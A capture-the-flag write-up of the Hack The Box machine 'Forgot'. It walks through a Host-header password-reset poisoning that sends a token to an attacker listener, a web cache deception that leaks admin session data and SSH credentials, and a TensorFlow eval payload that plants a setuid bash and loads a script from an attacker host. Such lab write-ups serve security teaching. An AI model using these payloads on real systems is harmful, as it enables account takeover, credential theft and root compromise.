---
layout: post
title: "The Letter You Mailed Yourself"
subtitle: "HTB Forgot, where a password-reset link gets addressed to your house, a cache hands you the admin's session by mistake, and a model that hunts for bad text reads it out loud as code"
date: 2023-03-11 12:00:00 +0000
description: "A reset link mailed to the wrong house, a cache that serves the admin's session to a stranger, and a security model that evaluates the very thing it was built to catch."
image: /assets/og/the-letter-you-mailed-yourself.png
tags: [hackthebox, writeup]
---

Forgot is a box about forms that trust the wrong thing. Three times in a row a piece of software believes a stranger about something it should have known on its own. The password-reset page believes you when you tell it your own address. The cache believes a URL when it claims to be a harmless static file. And the security script, the one whose entire job is to catch malicious text, believes that text enough to run it. None of these is a buffer overflow or a leaked key. Each one is a clerk taking dictation from a customer who is lying, and writing the lie into the record as if it were fact. You never break the lock. You just keep handing the building instructions it was built to obey.

```
        F O R G O T   ( password recovery )
        ====================================
        "where should i mail your reset link?"
        you:  "my house, obviously"   (Host: 10.10.14.4)
                        |
                        v
        the letter arrives at YOUR mailbox. you walk in.
                        |
        the cache files the admin's session under
        a name that says "just a static file, ignore me"
                        |
                        v
        the guard who screens for bad words
        reads one out loud, and it was a command.
                                            忘
```

## 0x01 · two doors and a clock

`nmap` keeps it short. SSH and a web port, nothing else answers.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
```

That `Werkzeug/Python` banner is the tell. This is a Flask app, hand-rolled, and the headers betray a second layer in front of it. Responses come back stamped `Varnish/6.2`, which means there is a cache sitting between you and the real server, holding copies of pages so the backend does not have to redraw them every time. File that away. A cache is a filing cabinet of pages someone already loaded, and the question that will matter later is who decides what gets filed and under what name.

A quick content sweep with `feroxbuster` turns up the shape of the site: `/login`, `/forgot`, `/reset`, `/tickets`, and a locked `/admin_tickets`. A help-desk ticketing portal with a self-service password reset. Every interesting thing on this box starts at that reset form.

## 0x02 · the letter you addressed yourself

The `/forgot` page takes a username, mints a one-time reset token, and emails the user a link to click. Standard stuff. The flaw is in how the link gets built. The app constructs the URL from the `Host` header of your own request.

```python
link = 'http://' + request.headers.get('host') + '/reset?token=' + token
```

Picture a clerk filling out the address on a reset letter, and instead of looking up your address on file, he leans over the counter and asks you to read it to him. You can say any address you like. So you say yours. The server is supposed to know its own name. Here it asks the visitor, and the visitor lies.

First you need a real username. The forgot page is happy to tell you which names exist, so a little enumeration produces a valid developer account, `robert-dev-10090`. Then you fire the reset, but with the `Host` header bent to point at your own machine.

```
POST /forgot HTTP/1.1
Host: 10.10.14.4
Content-Type: application/x-www-form-urlencoded

username=robert-dev-10090
```

Stand up a listener, and the reset link the app intended for the real Robert lands in your lap instead, token and all.

```
$ nc -lvnp 80
GET /reset?token=lQ3%2FPfcop1Ydljq4%2FfVIQ...%3D%3D HTTP/1.1
```

Carry that token back to the legitimate `/reset` endpoint, set a new password, and Robert's account is yours. You did not steal a password. You convinced the building to mail the spare key to your address and then thanked it for the service.

## 0x03 · the cache that filed the wrong page

Logged in as Robert, you can see your own tickets but not `/admin_tickets`, which still demands a higher session. This is where the Varnish layer stops being trivia and becomes the whole point.

Two facts have to meet. First, the Flask routes are greedy. They are written with catch-all wildcards, so `/admin_tickets`, `/admin_tickets/1`, and `/admin_tickets/literally-anything` all resolve to the same page.

```python
@app.route('/admin_tickets', defaults={'path': ''})
@app.route('/admin_tickets/<path:path>')
```

Second, Varnish has a caching rule that says anything with `/static` in its URL is a boring asset, an image or a stylesheet, so cache it and serve the saved copy to everyone for a few minutes. Harmless on its own. Lethal next to a wildcard route.

Glue them together and you get a URL like `/admin_tickets/static/iceberg`. To Flask, the `/static/iceberg` tail is just wildcard filler, so it serves the real admin page. To Varnish, the URL contains `/static`, so it files that page in the cabinet and hands it to whoever asks next, no login required. This trick has a name, web cache deception, and it is exactly as silly as it sounds. You dress a private page in a public page's clothes and the cache cannot tell them apart.

Think of it like the coat check at a fancy club. The attendant files coats by the ticket number you hand him, and he files yours under a number that says "lost and found, free to anyone." When the admin walks in wearing the real coat, the attendant dutifully tags it with your free-for-anyone number. You stroll up, ask for that number, and walk out wearing the boss's jacket with his keys still in the pocket.

The portal has a ticket-escalation form that gets an admin to view your ticket. So you submit a ticket whose link points at the poisoned `/admin_tickets/static/...` path. The admin's browser loads the authenticated admin page, and Varnish files that fully-authenticated copy, cookies and all, under the public name.

```
$ curl -s http://10.10.11.188/admin_tickets/static/iceberg | grep -i 'ssh\|session'
session=5ac7151b-74c6-4bce-92e8-c85e563b66ce
SSH credentials for diego: dCb#1!x0%gjq
```

The admin panel was helpfully listing SSH credentials for a user named `diego`. The cache served them to a stranger because the page was wearing a static file's name tag.

```
$ sshpass -p 'dCb#1!x0%gjq' ssh diego@10.10.11.188
diego@forgot:~$ cat user.txt
████████████████████████████████
```

## 0x04 · the guard who read the threat aloud

`diego` has one sudo right, and it is the kind of line that makes you sit up.

```
diego@forgot:~$ sudo -l
User diego may run the following commands without a password:
    (root) /opt/security/ml_security.py
```

A script you can run as root, and from its name it is a security tool. Reading it, the purpose is almost charming. It pulls every "reason" field that users typed into the ticket-escalation form, runs each one through a small machine-learning model trained to flag cross-site-scripting attempts, and anything the model scores as suspicious gets handed off for a closer look. A robot that reads incoming text and decides whether it smells like an attack.

The bug is in how it takes that closer look. The closer-look function comes from TensorFlow, `preprocess_input_exprs_arg_string`, and the script calls it with `safe=False`. That flag is not decoration. With `safe=False`, the function runs your text through Python's `eval`, which means it does not analyze the string, it executes it (CVE-2022-29216).

Picture a security guard whose job is to scan every letter for threatening language. He finds one full of menace, and instead of bagging it as evidence, he reads it aloud to the room as instructions. The model was supposed to judge the text. The next stage of the pipeline ran it. The whole machine was built to handle hostile input, and the one step in the middle treated that hostile input as a command.

So you craft a single ticket reason that does two jobs at once. It carries enough XSS-flavored junk to make the model score it as a threat (which is the entry ticket to the vulnerable branch), and it carries a Python expression for `eval` to run once it gets there. The Python half copies `bash`, marks the copy set-user-id root, and leaves it sitting on disk.

```
iceberg=exec("import os; os.system('cp /bin/bash /tmp/iceberg; chmod 4777 /tmp/iceberg')");#<script src=http://10.10.14.4/x.js></script>
```

Submit that as a ticket reason so it lands in the database, then let the root script chew on it.

```
diego@forgot:~$ sudo /opt/security/ml_security.py
diego@forgot:~$ ls -l /tmp/iceberg
-rwsrwxrwx 1 root root 1183448 /tmp/iceberg
diego@forgot:~$ /tmp/iceberg -p
iceberg-2.0# id
uid=1000(diego) gid=1000(diego) euid=0(root) groups=...
iceberg-2.0# cat /root/root.txt
████████████████████████████████
```

A set-uid copy of `bash` is a program that wears root's face no matter who runs it. The `-p` keeps the borrowed face on instead of dropping it. Root, because the threat detector ran the threat.

## 0x05 · the honest caveat

The temptation with Forgot is to call the privesc the scary part, because it has a CVE number and the word TensorFlow in it. But the CVE is the least interesting thing here. The genuinely instructive failure is the same shape three times, and it has nothing to do with machine learning.

Every step is a program trusting a stranger to describe reality. The reset form trusts you to say where the server lives, so it mails the key to your house. The cache trusts a URL to declare whether it is public or private, so it files a private page in the public drawer. And the security script trusts the incoming text enough to run it, which is the deepest version of the same mistake, because that text was hostile by definition. The job of that script was to assume the worst about every input. It assumed the input was code worth executing instead.

That is the thread. A `Host` header, a URL path, a ticket comment. These are all just things a stranger typed, and a stranger who types gets to lie. The fix is never clever. The reset link should be built from a server-side configured domain the attacker cannot touch. The cache should key on something the attacker cannot forge, not a substring of the path. And a security model should score text, full stop, and never sit upstream of an `eval`. Each door on Forgot was held open by a program that asked the visitor a question it should have answered for itself.

## 0x06 · outro

```
the reset link went to your house because the form asked you for the address.
the admin's session sat in the public drawer because a URL claimed to be static.
the guard read the threat aloud because the threat was the part it ran.

three forms. three lies believed. not one lock forced.

never let the visitor name the server. never cache what you cannot key.
never run the thing you were built to catch. wear black.

                                                            EOF
```

---

*HTB: Forgot, retired 04 Mar 2023. A medium Linux box that is really a triptych on trusting the stranger's description of the world: a host-header reset, a web cache deception, and a security model wired straight into eval. The letter still arrives at your mailbox in a lab and nowhere you don't own.*